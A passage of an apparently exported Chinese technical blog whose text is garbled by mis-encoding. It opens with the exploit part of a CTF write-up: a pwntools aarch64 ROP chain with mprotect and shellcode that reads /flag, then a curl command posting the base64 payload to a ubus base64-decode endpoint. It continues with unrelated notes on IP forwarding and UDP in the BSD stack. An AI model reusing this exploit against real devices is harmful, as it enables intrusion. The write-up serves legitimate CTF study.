id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åŸºæœ¬æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨æº¢å‡ºæ„é€ arm64æ¶æ„ä¸‹çš„ROP</li><li>è½¬æˆbase64åç”¨è®¿é—®å¯¹åº”apiæ¥å£å³å¯</li></ul><h3 id="æ„é€ ROPä»¥åŠbase64è½¬æ¢éƒ¨åˆ†"><a href="#æ„é€ ROPä»¥åŠbase64è½¬æ¢éƒ¨åˆ†" class="headerlink" title="æ„é€ ROPä»¥åŠbase64è½¬æ¢éƒ¨åˆ†"></a>æ„é€ ROPä»¥åŠbase64è½¬æ¢éƒ¨åˆ†</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;aarch64&quot;</span><br><span class="hljs-comment"># p = process([&quot;./base64&quot;, &quot;decode&quot;])</span><br><span class="hljs-comment"># elf = ELF(&quot;./elf&quot;)</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment"># 0x00000000004494b8 : ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span><br>set_x0 = <span class="hljs-number">0x00000000004494b8</span><br><span class="hljs-comment"># 0x00000000004010ec : ldr x1, [sp, #0x28] ; add x0, x1, x0 ; ldp x29, x30, [sp],</span><br><span class="hljs-comment">#0x30 ; ret</span><br>set_x1 = <span class="hljs-number">0x00000000004010ec</span><br><span class="hljs-comment"># call mprotect(x0[0x92] + x0[0x94], x0[0x93] - x0[0x94], 7)</span><br>call_mprotect = <span class="hljs-number">0x00000000004579A4</span><br>shellcode = shellcraft.aarch64.linux.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>)<br>shellcode += shellcraft.aarch64.linux.read(<span class="hljs-number">3</span>, <span class="hljs-number">0x4a23a4</span>, <span class="hljs-number">0x100</span>)<br>shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    MOV X3, X0</span><br><span class="hljs-string">    LDR X1, =0x22</span><br><span class="hljs-string">    LDR X2, =0x4a23a3</span><br><span class="hljs-string">    STRB W1, [X3, X2]</span><br><span class="hljs-string">    LDR X1, =0x7d</span><br><span class="hljs-string">    LDR X2, =0x4a23a4</span><br><span class="hljs-string">    STRB W1, [X3, X2]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.aarch64.linux.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x4a2398</span>, <span class="hljs-number">0x100</span>)<br>shellcode += <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    LDR X0, =1</span><br><span class="hljs-string">    LDR X9, =0x422D60</span><br><span class="hljs-string">    BLR X9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(shellcode,bits = <span class="hljs-number">64</span>)<br>payload = payload.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-number">0x4A3000</span>)<br>payload += p64(<span class="hljs-number">0x4A2000</span>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += <span class="hljs-string">b&quot;&#123;\&quot;output\&quot;: \&quot;&quot;</span><br>payload = payload.ljust(<span class="hljs-number">0x400</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char1</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char2</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char3</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char3</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char4</span><br>payload += <span class="hljs-string">b&quot;A\x00\x00\x00&quot;</span> <span class="hljs-comment"># char4</span><br>payload += <span class="hljs-string">b&quot;\x18\x06\x00\x00&quot;</span> <span class="hljs-comment"># input lenght</span><br>payload += <span class="hljs-string">b&quot;\x1d\x04\x00\x00&quot;</span> <span class="hljs-comment"># output idx</span><br>payload += <span class="hljs-string">b&quot;\x84\x05\x00\x00&quot;</span> <span class="hljs-comment"># input idx</span><br>payload += <span class="hljs-string">b&quot;\x92\x04\x00\x00&quot;</span> <span class="hljs-comment"># output length</span><br>payload += p64(<span class="hljs-number">0x4A2500</span>) <span class="hljs-comment"># x29</span><br>payload += p64(set_x0) <span class="hljs-comment"># x30</span><br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>payload += p64(<span class="hljs-number">0x4A2500</span>) <span class="hljs-comment"># x29</span><br>payload += p64(call_mprotect) <span class="hljs-comment"># x30</span><br>payload += p64(<span class="hljs-number">0x4A2298</span> - <span class="hljs-number">0x490</span>) <span class="hljs-comment"># x0</span><br>payload += <span class="hljs-string">b&quot;BBBBBBBB&quot;</span><br>payload += <span class="hljs-string">b&quot;CCCCCCCC&quot;</span><br>payload += p64(<span class="hljs-number">0x4A2098</span>)<br>payload += <span class="hljs-string">b&quot;EEEEEEEE&quot;</span><br><span class="hljs-comment"># p.sendline()</span><br><span class="hljs-comment"># p.interactive()</span><br>payload = base64.b64encode(payload)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><h3 id="shellè„šæœ¬è®¿é—®apiæ¥å£"><a href="#shellè„šæœ¬è®¿é—®apiæ¥å£" class="headerlink" title="shellè„šæœ¬è®¿é—®apiæ¥å£"></a>shellè„šæœ¬è®¿é—®apiæ¥å£</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">curl --<span class="hljs-keyword">location</span> <span class="hljs-title">&#x27;http</span>://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9999</span>/ubus&#x27; \<br>    --header &#x27;Content-<span class="hljs-keyword">Type</span>: application/json&#x27; \<br>    --data &#x27;&#123;<br>        <span class="hljs-string">&quot;jsonrpc&quot;</span>: <span class="hljs-string">&quot;2.0&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;method&quot;</span>: <span class="hljs-string">&quot;call&quot;</span>,<br>        <span class="hljs-string">&quot;params&quot;</span>: [<br>            <span class="hljs-string">&quot;00000000000000000000000000000000&quot;</span>,<br>            <span class="hljs-string">&quot;base64&quot;</span>,<br>            <span class="hljs-string">&quot;decode&quot;</span>,<br>            &#123;<br>                <span class="hljs-string">&quot;input&quot;</span>:<br>                <span class="hljs-string">&quot;7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADU4wMAquEBAFgCAgBYYWgiOAECAFgiAgBYYWgiOCAAgNIBc4TSQQmg8gIggNIICIDSAQAA1GABAFiJAQBYIAE/1iIAAAAAAAAAoyNKAAAAAAB9AAAAAAAAAKQjSgAAAAAAAQAAAAAAAABgLUIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwSgAAAAAAACBKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeyJvdXRwdXQiOiAiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEEAAABBAAAAQQAAAEEAAABBAAAAQQAAABgGAAAdBAAAhAUAAJIEAAAAJUoAAAAAALiURAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUoAAAAAAKR5RQAAAAAACB5KAAAAAABCQkJCQkJCQkNDQ0NDQ0NDmCBKAAAAAABFRUVFRUVFRQ==&quot;</span><br>            &#125;<br>        ]<br>    &#125;&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘ç»œåè®®æ ˆCH8åŠCH23</title>
    <link href="/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23/"/>
    <url>/2023/04/25/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ˜¨æ™šæåˆ°å¿«ä¸¤ç‚¹ï¼Œä»Šå¤©9.30æ‰èµ·åºŠï¼Œå¸Œæœ›11ç‚¹åŠä¹‹å‰èƒ½æå®Œå»åƒé¥­ğŸ˜­</p></blockquote><h2 id="ç¬¬å…«ç« -IPï¼šç½‘é™…åè®®"><a href="#ç¬¬å…«ç« -IPï¼šç½‘é™…åè®®" class="headerlink" title="ç¬¬å…«ç«  IPï¼šç½‘é™…åè®®"></a>ç¬¬å…«ç«  IPï¼šç½‘é™…åè®®</h2><h3 id="IPåˆ†ç»„"><a href="#IPåˆ†ç»„" class="headerlink" title="IPåˆ†ç»„"></a>IPåˆ†ç»„</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425092925635.png" alt="image-20230425092925635"></p><p>å‚ç…§ä¸Šå›¾ï¼Œæœ‰å‡ ä¸ªåŸºæœ¬æ¦‚å¿µï¼ˆæœ¬ä¾‹ä¸­çš„ä¼ è¾“å±‚åè®®ä¸ºUDPï¼‰ï¼š</p><ul><li><strong>æŠ¥æ–‡</strong>ï¼šç”±ä¼ è¾“å±‚é€è‡³IPçš„æ•°æ®æŠ¥ï¼Œæœ¬èº«åŒ…å«ä¼ è¾“å±‚é¦–éƒ¨å’Œæ•°æ®</li><li><strong>æ•°æ®æŠ¥</strong>ï¼šIPåœ¨æŠ¥æ–‡çš„å‰é¢åŠ ä¸Šè‡ªå·±çš„IPé¦–éƒ¨ï¼Œä¸”æ ¹æ®é•¿åº¦è€ƒè™‘æ˜¯å¦åˆ†ç‰‡ï¼ˆä¸Šå›¾1-2è¡Œï¼‰</li><li><strong>å¸§</strong>ï¼šIPå°†åˆ†å¥½ç‰‡çš„æ•°æ®æŠ¥äº¤ç»™æ•°æ®é“¾è·¯å±‚ï¼Œæ•°æ®é“¾è·¯å¡«ä¸Šè‡ªå·±çš„é¦–éƒ¨åå˜ä¸ºå¸§ï¼ˆä¸Šå›¾3è¡Œï¼‰</li><li><strong>åˆ†ç»„</strong>ï¼šä¸€ä¸ªåˆ†ç‰‡çš„æ•°æ®æŠ¥æˆ–è€…ä¸€ä¸ªä¸éœ€åˆ†ç‰‡çš„æ•°æ®æŠ¥ä¸ºåˆ†ç»„</li></ul><blockquote><p> éœ€æ³¨æ„çš„æ˜¯IPæ•°æ®æŠ¥ç»“æ„å­˜å‚¨ä¸å—æœºå™¨å¤§å°ç«¯çš„å½±å“ï¼Œå‡æŒ‰ç…§ä¸‹é¢åœ°å€ç»“æ„å­˜å‚¨</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425093907332.png" alt="image-20230425093907332"></p><p>IPæ•°æ®æŠ¥ç»“æ„å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸Šé¢çš„ä¸ªéƒ¨åˆ†å«ä¹‰å·²åœ¨å›¾ä¸­æ ‡å‡º</p><blockquote><p>å¯èƒ½éœ€æ³¨æ„çš„åœ°æ–¹ï¼š<code>ip_hl</code>å¸¸ç”¨4å­—èŠ‚åº¦é‡ï¼Œå³å½“<code>ip_hl == 5</code>æ—¶ï¼Œå®é™…é¦–éƒ¨é•¿åº¦ä¸º5*4&#x3D;20ã€‚å…¶ä¸­é€‰é¡¹çš„éƒ¨åˆ†ä¸º0~40ä¸ç­‰ï¼Œæ‰€ä»¥<code>ip_hl</code>çš„æœ€å¤§å€¼ä¸ºï¼š(20+40)&#x2F;4 &#x3D; 15ï¼Œæœ€å°å€¼ä¸ºï¼š20&#x2F;4&#x3D;5ã€‚å¦å¤–ï¼Œç”±äºip_hlä¸º4çš„å€æ•°ï¼Œæ‰€ä»¥é€‰é¡¹çš„é•¿åº¦ä¸€èˆ¬ä¹Ÿä¸º4çš„å€æ•°ã€‚</p></blockquote><h3 id="ipintrå‡½æ•°"><a href="#ipintrå‡½æ•°" class="headerlink" title="ipintrå‡½æ•°"></a>ipintrå‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ipintr</span> <span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">ip</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">m</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipq</span> *<span class="hljs-title">fp</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_ifaddr</span> *<span class="hljs-title">ia</span>;</span><br>        <span class="hljs-type">int</span> hlen, s;<br>    next:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            Get next datagram off input queue and get IP header</span><br><span class="hljs-comment">            in first mbuf.</span><br><span class="hljs-comment">        */</span><br>        s = splimp() ;<br>        IF_DEQUEUE (&amp;ipintrq, m) ;<br>        sp1x(s);<br>        <span class="hljs-keyword">if</span>(m==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">            å¾ˆå¤šå¾ˆå¤šä»£ç ğŸ˜­</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">goto</span> nextï¼›<br>    bad:<br>        m_freem(m);<br>        <span class="hljs-keyword">goto</span> next;<br>&#125;    <br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„åŸºæœ¬æ¡†æ¶å¦‚ä¸Šï¼Œå¤§è‡´å°±æ˜¯ä¾é ä¸¤ä¸ªgotoå®ç°å¯¹åˆ†ç»„å¤„ç†çš„å¾ªç¯ï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºç»“æŸã€‚ä¸­é—´çœç•¥çš„ä»£ç ä¸»è¦åšä¸‹é¢å‡ ä»¶äº‹ï¼ˆå®åœ¨å¤ªé•¿äº†ï¼‰ï¼š</p><ol><li>éªŒè¯ï¼šæŠŠåˆ†ç»„ä»<code>ipintrq</code>ä¸­å–å‡ºï¼ŒéªŒè¯å®ƒä»¬çš„å†…å®¹ï¼ŒæŸåå’Œæœ‰å·®é”™çš„åˆ†ç»„è‡ªåŠ¨è¢«ä¸¢å¼ƒã€‚</li><li>è½¬å‘æˆ–ä¸è½¬å‘ï¼šè°ƒç”¨<code>ip_dooptions</code>æ¥å¤„ç†IPé€‰é¡¹ï¼Œå¦‚æœæ²¡åˆ°è¾¾æœ€ç»ˆç›®çš„åœ°å°±å°è¯•è½¬å‘ï¼Œåä¹‹äº¤ç»™å¯¹åº”ä¼ è¾“å±‚åè®®</li><li>é‡è£…ï¼ˆé‡è£…åœ¨ç¬¬10ç« è®²ï¼Œé‚£æˆ‘å°±ä¸ç®¡äº†ï¼Œå¼€æ‘†ï¼ï¼‰</li><li>åˆ†ç”¨ï¼šé‡è£…å®Œå…¨çš„æ•°æ®æŠ¥ï¼ŒipæŒ‡é’ˆè®¾ç½®ä¸ºåˆ°è¾¾ç›®çš„åœ°çš„å®Œæ•´æ•°æ®æŠ¥ï¼Œåä¹‹ä¸ºç©º</li></ol><h3 id="ip-forwardå‡½æ•°"><a href="#ip-forwardå‡½æ•°" class="headerlink" title="ip_forwardå‡½æ•°"></a>ip_forwardå‡½æ•°</h3><p>åˆ°è¾¾éç›®çš„åœ°çš„åˆ†ç»„éœ€è¦è¢«è½¬å‘ã€‚åªæœ‰å½“<strong>ipforwardingéé›¶</strong>æˆ–å½“åˆ†ç»„ä¸­åŒ…å«<strong>æºè·¯ç”±</strong>æ—¶ï¼Œipintræ‰è°ƒç”¨è¯¥å‡½æ•°<code>ip_forward</code>å®ç°è½¬å‘ã€‚ip_forwardä¾é routeç»“æ„ä½“ä¸è·¯ç”±è¡¨æ¥å£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">route</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rtentry</span> *<span class="hljs-title">ro_rt</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">ro_dst</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>ro_rt</code> æŒ‡å‘ä¸è·¯ç”±è¡¨ç›¸å…³çš„rtentryç»“æ„ä½“</li><li><code>ro_dst </code>æŒ‡å‘å­˜æ”¾ç›®çš„åœ°å€ä¿¡æ¯çš„sockaddrç»“æ„ä½“</li></ul><p><code>ip_forward()</code>çš„åŸºæœ¬æµç¨‹åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li>ç¡®å®šç³»ç»Ÿæ˜¯å¦éœ€è¦è½¬å‘æ­¤åˆ†ç»„ï¼Œä¿®æ”¹IPé¦–éƒ¨ï¼Œä½åˆ†ç»„é€‰æ‹©è·¯ç”±</li><li>å¤„ç†ICMPé‡å®šå‘æŠ¥æ–‡ï¼Œå¹¶æŠŠåˆ†ç»„äº¤ç»™<code>ip_output</code>è¿›è¡Œè½¬å‘</li></ul><blockquote><p>æµç¨‹ä¸­å¯èƒ½éœ€æ³¨æ„çš„ç‚¹ï¼š</p><ul><li>IPè½¬å‘ç®—æ³•æŠŠæœ€è¿‘çš„è·¯ç”±ç¼“å­˜åœ¨å…¨å±€routeç»“æ„çš„ipforward_rtä¸­</li><li>å½“è½¬å‘é”™è¯¯æ—¶ï¼Œç”±ä¸”ä»…ç”±è·¯ç”±å™¨å‘æºä¸»æœºè¿”å›ICMPé‡å®šå‘æŠ¥æ–‡ï¼Œä»¥æ­¤æ›´æ–°ä¸»æœºè·¯ç”±è¡¨</li></ul></blockquote><h3 id="ip-output"><a href="#ip-output" class="headerlink" title="ip_output"></a>ip_output</h3><p><code>ip_output</code>ä¸ºIPè¾“å‡ºä»£ç ï¼Œä¸»è¦ä¸ºä¸‰éƒ¨åˆ†ï¼š</p><ul><li>é¦–éƒ¨åˆå§‹åŒ–</li><li>è·¯ç”±é€‰æ‹©</li><li>æºåœ°å€é€‰æ‹©å’Œåˆ†ç‰‡</li></ul><h2 id="ç¬¬23ç« -UDP"><a href="#ç¬¬23ç« -UDP" class="headerlink" title="ç¬¬23ç«  UDP"></a>ç¬¬23ç«  UDP</h2><h3 id="æ•´ä½“æ•°æ®ä¼ è¾“æ¡†æ¶"><a href="#æ•´ä½“æ•°æ®ä¼ è¾“æ¡†æ¶" class="headerlink" title="æ•´ä½“æ•°æ®ä¼ è¾“æ¡†æ¶"></a>æ•´ä½“æ•°æ®ä¼ è¾“æ¡†æ¶</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425104820413.png" alt="image-20230425104820413"></p><blockquote><p>æ•´ä½“æ¡†æ¶å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ï¼š</p><p>ç”¨æˆ·è¿›ç¨‹(åº”ç”¨å±‚)â€“&gt;UDP(ä¼ è¾“å±‚)â€“&gt;IP(ç½‘ç»œå±‚)â€“&gt;æ•°æ®é“¾è·¯å±‚â€“&gt;ç¡¬ä»¶ç½‘å¡(ç‰©ç†å±‚)</p></blockquote><h3 id="UDP-é¦–éƒ¨"><a href="#UDP-é¦–éƒ¨" class="headerlink" title="UDP é¦–éƒ¨"></a>UDP é¦–éƒ¨</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88CH8%E5%8F%8ACH23.assets/image-20230425105506669.png" alt="image-20230425105506669"></p><p>UDPé¦–éƒ¨å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹åº”åŸŸçš„å«ä¹‰ä¹Ÿæœ‰æ ‡è®°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯IPé¦–éƒ¨å’ŒUDPé¦–éƒ¨ä¸€èˆ¬æ˜¯ç´§æŒ¨åœ¨ä¸€èµ·ï¼Œæˆ‘ä»¬åœ¨CH1-CH3ä¸­åˆ†æmbufæ—¶å·²ç»å¯ä»¥æ³¨æ„åˆ°è¿™ç§ç°è±¡ã€‚è€Œå®é™…ä¸Šåœ¨udpå†…ç›¸å…³å‡½æ•°ï¼ˆå¦‚<code>udp_input</code>,<code>udp_output</code>ï¼‰å¤„ç†æ—¶ä¹Ÿä¼šå°†ä¸¤è€…æ”¾åœ¨ä¸€èµ·ä½¿ç”¨ï¼Œä»–ä»¬å…±åŒæ„æˆäº†ç»“æ„ä½“<code>udpiphdr</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udpiphdr</span>&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ippvly</span> <span class="hljs-title">ui_i</span>;</span> <span class="hljs-comment">/* overlaidip structure*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udphdr</span> <span class="hljs-title">ui_u</span>;</span><span class="hljs-comment">/* udp header*/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>20å­—èŠ‚çš„IPé¦–éƒ¨è¢«å®šä¹‰ä¸º ippvlyç»“æ„ä½“ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå¯è‡ªè¡Œå¯¹ç…§IPé¦–éƒ¨ç»“æ„å›¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipov1y</span> &#123;</span><br><span class="hljs-type">caddr_t</span> ih_next, ih_prev;<span class="hljs-comment">/* for protocol sequence q&#x27;s */</span><br>u_char ih_x1; <span class="hljs-comment">/* (unused) */</span><br>u_char ih_pr;<span class="hljs-comment">/* protocol */</span><br><span class="hljs-type">short</span> ih_len;<span class="hljs-comment">/* protocol length */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">ih_src</span>;</span> <span class="hljs-comment">/* source internet address */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">ih_dst</span>;</span> <span class="hljs-comment">/* destination internet address */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="udp-initå‡½æ•°"><a href="#udp-initå‡½æ•°" class="headerlink" title="udp_initå‡½æ•°"></a>udp_initå‡½æ•°</h3><p>åˆå§‹åŒ–å‡½æ•°ï¼Œç”¨æ¥æ„å»ºPCBåŒå‘é“¾è¡¨çš„èµ·å§‹ï¼Œè®©å¤´éƒ¨PCBçš„nextæŒ‡é’ˆå’ŒprevæŒ‡é’ˆéƒ½æŒ‡å‘è‡ªå·±ã€‚éœ€æ³¨æ„UDPä¸´æ—¶ç«¯å£å·ç”±1024å¼€å§‹åˆ†é…</p><blockquote><p>å‰0~1023ç«¯å£ä¸ºå¸¸ç”¨ç«¯å£ï¼Œä¸€èˆ¬éƒ½æœ‰å›ºå®šå¯¹åº”æœåŠ¡ï¼Œæƒ³è¦ç›‘å¬è¿™äº›ç«¯å£æ—¶ä¹Ÿéœ€è¦sudoæƒé™</p><p>PCBæ˜¯22ç« çš„æ¦‚å¿µï¼šPCBåè®®æ§åˆ¶å—å­˜æ”¾å„UDPå’ŒTCPæ’å£æ‰€è¦æ±‚çš„å¤šä¸ªä¿¡æ¯ç‰‡ï¼ŒUDPæ‰€éœ€è¦çš„æ‰€æœ‰ä¿¡æ¯éƒ½å¯ä»¥åœ¨Internet PCBä¸­æ‰¾åˆ°ï¼Œä¸å­˜åœ¨UDPæ§åˆ¶å—</p></blockquote><h3 id="udp-outå‡½æ•°"><a href="#udp-outå‡½æ•°" 